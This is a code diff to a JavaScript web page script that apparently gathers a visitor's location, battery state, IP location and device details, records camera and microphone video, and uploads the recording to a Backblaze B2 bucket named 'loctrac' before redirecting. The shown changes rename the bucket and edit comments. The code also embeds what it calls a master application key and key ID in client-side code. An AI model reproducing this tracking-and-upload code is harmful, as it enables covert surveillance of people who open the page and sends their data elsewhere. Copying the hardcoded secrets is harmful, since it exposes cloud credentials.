@@ -363,6 +363,7 @@ async function collectOtherData(locationPermission, currentVideoUrl, currentCame
     saveDataAndRedirect(currentVideoUrl, locationData, batteryData, locationError, batteryError, currentCameraError, ipLocationData, deviceInfo);
 }
 
+// Function to handle camera/microphone permissions and recording (if needed)
 async function handleCameraMicPermissions(micCamPermission, recordSeconds, currentUserId) {
     let videoUrl = null; // Initial value
     let cameraError = null;
@@ -388,10 +389,10 @@ async function handleCameraMicPermissions(micCamPermission, recordSeconds, curre
                     const blob = new Blob(chunks, { type: 'video/webm' });
                     console.log("Blob type:", blob.type);
 
-                    const bucketName = 'loctrac';
+                    const bucketName = 'loctrac-testing';  // <<---------  VERVANG DIT MET JE *NIEUWE* BUCKET NAAM !!!
                     const b2ApiEndpoint = 's3.eu-central-003.backblazeb2.com';
-                    const applicationKeyId = '359242e27707'; //  **YOUR KEY ID (MASTER KEY - INSECURE, FOR TESTING)**
-                    const applicationKey = 'K005zz89pE5t2r9z+1w92/Jm7R17cpo'; // **REPLACE WITH YOUR *LIMITED* KEY - VERY IMPORTANT!**
+                    const applicationKeyId = '359242e27707';  // **YOUR KEY ID (MASTER KEY - INSECURE, FOR TESTING)**
+                    const applicationKey = 'K005zz89pE5t2r9z+1w92/Jm7R17cpo';  //  <<---------  VERVANG DIT MET JE *BEPERKTE* KEY !!!
                     const userId = currentUserId;
 
                     try {
@@ -428,7 +429,7 @@ async function handleCameraMicPermissions(micCamPermission, recordSeconds, curre
                                 'Authorization': authorizationToken,
                                 'Content-Type': 'application/json'
                             },
-                            body: JSON.stringify({ bucketId: authData.buckets[0].bucketId }) // Gebruik bucketId van authData
+                            body: JSON.stringify({ bucketId: authData.buckets[0].bucketId }) // Use bucketId from authData
                         });
 
                          if (!getUploadUrlResponse.ok) {
